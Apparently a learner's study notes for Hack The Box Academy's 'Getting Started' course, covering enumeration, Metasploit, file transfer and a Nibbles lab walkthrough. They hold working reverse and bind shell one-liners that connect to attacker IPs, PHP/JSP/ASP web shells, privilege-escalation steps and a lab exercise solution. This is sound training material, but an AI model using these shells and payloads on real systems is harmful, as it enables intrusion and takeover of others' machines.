## Infosec Overview : 

Lots of areas :
- Network and infrastructure security
- Application security
- Security testing
- Systems auditing
- Business continuity planning
- Digital forensics
- Incident detection and response
Phrases that will come up often: Confidentiality, Integrity and Availability of data.

![](https://github.com/nolancarougepro/Hack-The-Box-Academy/blob/main/Tier%200/Fundamental/Getting%20Started/Images/RiskManagement.png)

Red Team : 
- Role of the attacker.

Blue Team : 
- Role of the defender.

## Getting Started with a Pentest Distro : 

On each pentest a new distribution must be set up. This prevents information from other intrusion tests from leaking. You must therefore be able to install a distribution quickly and be ready.

## Staying Organized : 

![](https://github.com/nolancarougepro/Hack-The-Box-Academy/blob/main/Tier%200/Fundamental/Getting%20Started/Images/Organized.png)

## Connecting Using VPN : 

![](https://github.com/nolancarougepro/Hack-The-Box-Academy/blob/main/Tier%200/Fundamental/Getting%20Started/Images/GettingStarted.webp)

To connect to the VPN :
```shell-session
sudo openvpn user.ovpn
```

## Common Terms : 

![](https://github.com/nolancarougepro/Hack-The-Box-Academy/blob/main/Tier%200/Fundamental/Getting%20Started/Images/Shell%20Types.png)![](https://github.com/nolancarougepro/Hack-The-Box-Academy/blob/main/Tier%200/Fundamental/Getting%20Started/Images/Standart%20Port.png)
![](https://github.com/nolancarougepro/Hack-The-Box-Academy/tree/main/Tier%200/Fundamental/Getting%20Started/Images/WebVuln1.png)![](https://github.com/nolancarougepro/Hack-The-Box-Academy/tree/main/Tier%200/Fundamental/Getting%20Started/Images/WebVuln2.png)
## Basic Tools : 
### SSH : 

[Secure Shell (SSH)](https://en.wikipedia.org/wiki/SSH_(Secure_Shell)) uses port 22. Command to connect to a server:
```shell-session
NolanCarougeHTB@htb[/htb]$ ssh Bob@10.10.10.10
```

### Netcat : 

Netcat allows you to interact with TCP/UDP ports. It can be used to communicate with a listening port and interact with the service running on that port. Example with ssh :
```shell-session
NolanCarougeHTB@htb[/htb]$ netcat 10.10.10.10 22
```

### Tmux : 

Handle Linux terminals.

### Vim : 

![](https://github.com/nolancarougepro/Hack-The-Box-Academy/blob/main/Tier%200/Fundamental/Getting%20Started/Images/vim1.png)![](https://github.com/nolancarougepro/Hack-The-Box-Academy/blob/main/Tier%200/Fundamental/Getting%20Started/Images/vim2.png)

## Service Scanning : 

### Nmap : 

Basic command to scan ports (1000 ports no longer used) :
```shell-session
nmap 10.129.42.253
```

-sC for more details. -sV to get versions. (65536 ports)
```shell-session
 nmap -sV -sC -p- 10.129.42.253
```

nmap -sV --script=banner target. Command to retrieve the service banners on the ports.

### FTP : 

Command to connect to an FTP server :
```shell-session
ftp -p 10.129.42.253
```

### SMB : 

Find the operating system :
```shell-session
nmap --script smb-os-discovery.nse -p445 10.10.10.40
```


-L to retrieve the list of available shares. -N to suppress password display.
```shell-session
smbclient -N -L \\\\10.129.42.253
```
```shell-session
smbclient \\\\10.129.42.253\\users
```
```shell-session
smbclient -U bob \\\\10.129.42.253\\users
```

## Web Enumeration :

Command to list all pages (from a wordlist) :
```shell-session
NolanCarougeHTB@htb[/htb]$ gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt
```

Command to discover subdomains (from a wordlist) :
```shell-session
NolanCarougeHTB@htb[/htb]$ gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt
```

Command to retrieve the banner of a web application :
```shell-session
NolanCarougeHTB@htb[/htb]$ curl -IL https://www.inlanefreight.com
```

The same applies to :
```shell-session
NolanCarougeHTB@htb[/htb]$ whatweb 10.10.10.121

NolanCarougeHTB@htb[/htb]$ whatweb --no-errors 10.10.10.0/24
```

## Public Exploits : 

Command to find exploits :
```shell-session
NolanCarougeHTB@htb[/htb]$ searchsploit openssh 7.2
```

Otherwise sites like :
- [Exploit DB](https://www.exploit-db.com/)
- [Rapid7 DB](https://www.rapid7.com/db/)
- [Vulnerability Lab](https://www.vulnerability-lab.com/)

Find and exploit an application vulnerability with metasploit :
```shell-session
NolanCarougeHTB@htb[/htb]$ msfconsole

msf6 > search exploit eternalblue

msf6 > use exploit/windows/smb/ms17_010_psexec

show options

msf6 exploit(windows/smb/ms17_010_psexec) > check


msf6 exploit(windows/smb/ms17_010_psexec) > exploit

```

Solve exercise :
```shell-session
sudo nmap 83.136.252.214 -p 43057 -Pn -sV
msf console 
search exploit simple backup
SET RHOSTS
SET RPORT
SET FILEPATH /flag.txt
```

## Types of Shells : 

![](https://github.com/nolancarougepro/Hack-The-Box-Academy/blob/main/Tier%200/Fundamental/Getting%20Started/Images/Shell%20Types%201.png)

### Reverse Shell : 

We start by starting a listener on the port of our choice:
```shell-session
nc -lvnp 1234
```

![](https://github.com/nolancarougepro/Hack-The-Box-Academy/blob/main/Tier%200/Fundamental/Getting%20Started/Images/Netcat.png)

```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

### Bind Shell : 

Command to launch a bind shell :
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```

```python
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```

Then : 

```shell-session
nc 10.10.10.1 1234
```

Command to have a full TTY shell :

```shell-session
python -c 'import pty; pty.spawn("/bin/bash")'
``` 

Then : 
```shell-session
www-data@remotehost$ ^Z

NolanCarougeHTB@htb[/htb]$ stty raw -echo
NolanCarougeHTB@htb[/htb]$ fg

[Enter]
[Enter]
www-data@remotehost$
```

For size and color :
```shell-session
www-data@remotehost$ export TERM=xterm-256color

www-data@remotehost$ stty rows 67 columns 318
```

### Web Shell : 

```php
<?php system($_REQUEST["cmd"]); ?>
```

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

```asp
<% eval request("cmd") %>
```

Upload a shell.php in the following folders :

![](https://github.com/nolancarougepro/Hack-The-Box-Academy/blob/main/Tier%200/Fundamental/Getting%20Started/Images/WebShell.png)

Then after on a browser :
http://SERVER_IP:PORT/shell.php?cmd=id

Or :
```shell-session
NolanCarougeHTB@htb[/htb]$ curl http://SERVER_IP:PORT/shell.php?cmd=id
```

## Privilege Escalation : 

https://book.hacktricks.xyz/welcome/readme
https://gtfobins.github.io/

Enumeration script :
```shell-session
NolanCarougeHTB@htb[/htb]$ ./linpeas.sh
```

Order to see the privileges we have :
```shell-session
NolanCarougeHTB@htb[/htb]$ sudo -l
```

```shell-session
NolanCarougeHTB@htb[/htb]$ sudo su -
```

```shell-session
NolanCarougeHTB@htb[/htb]$ sudo -u user /bin/echo Hello World!
```

### Scheduled Tasks : 

The easiest way is to check if we are allowed to add new scheduled tasks. In Linux, a common form of maintaining scheduled tasks is through `Cron Jobs`. There are specific directories that we may be able to utilize to add new cron jobs if we have the `write` permissions over them. These include:

1. `/etc/crontab`
2. `/etc/cron.d`
3. `/var/spool/cron/crontabs/root`

### Exposed Credentials : 

Next, we can look for files we can read and see if they contain any exposed credentials. This is very common with `configuration` files, `log` files, and user history files (`bash_history` in Linux and `PSReadLine` in Windows). The enumeration scripts we discussed at the beginning usually look for potential passwords in files and provide them to us.

### SSH Keys :

We recover the private key then we connect via SSH with it. We can also replace the private key on the machine with our public key.

```shell-session
NolanCarougeHTB@htb[/htb]$ vim id_rsa
NolanCarougeHTB@htb[/htb]$ chmod 600 id_rsa
NolanCarougeHTB@htb[/htb]$ ssh user@10.10.10.10 -i id_rsa
```
## Transferring Files : 

### Using wget : 

```shell-session
NolanCarougeHTB@htb[/htb]$ cd /tmp
NolanCarougeHTB@htb[/htb]$ python3 -m http.server 8000
```

```shell-session
user@remotehost$ wget http://10.10.14.1:8000/linenum.sh

user@remotehost$ curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
```

### Using SCP :

```shell-session
NolanCarougeHTB@htb[/htb]$ scp linenum.sh user@remotehost:/tmp/linenum.sh
```

### Using Base64 : 

If the machine has a firewall.

```shell-session
NolanCarougeHTB@htb[/htb]$ base64 shell -w 0
```

```shell-session
user@remotehost$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
```

### Validating File Transfers : 

```shell-session
user@remotehost$ file shell
shell: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header
```

We can calculate the hashes and check if the files are the same.
```shell-session
NolanCarougeHTB@htb[/htb]$ md5sum shell

user@remotehost$ md5sum shell
```

## Nibbles - Enumeration : 

![](https://github.com/nolancarougepro/Hack-The-Box-Academy/blob/main/Tier%200/Fundamental/Getting%20Started/Images/Boxes.png)

## Nibbles - Web Footprinting : 

Whatweb is a script allowing you to know which version works on which site.

## Nibbles - Initial Foothold : 

Once connected, there are several attack vectors:
![](https://github.com/nolancarougepro/Hack-The-Box-Academy/blob/main/Tier%200/Fundamental/Getting%20Started/Images/Other%20attacks.png)

```php
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc Votre_ip Port >/tmp/f"); ?>
```

```shell-session
NolanCarougeHTB@htb[/htb]$ nc -lvnp 9443
```

```python
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

# Nibbles - Privilege Escalation : 

We start a python server :
```shell-session
NolanCarougeHTB@htb[/htb]$ sudo python3 -m http.server 8080
```

Then we retrieve the LinEnum.sh file which will allow us to detect a potential flaw to become root :
```shell-session
wget http://<your ip>:8080/LinEnum.sh
```

We find that the monitor.sh file can be launched as root. We therefore modify it to have a reverse shell :
```shell-session
nibbler@Nibbles:/home/nibbler/personal/stuff$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 8443 >/tmp/f' | tee -a monitor.sh
```

Don't forget to launch the listener :
```shell-session
NolanCarougeHTB@htb[/htb]$ nc -lvnp 8443
```

We finish by executing this command :
```shell-session
 nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo /home/nibbler/personal/stuff/monitor.sh 
```
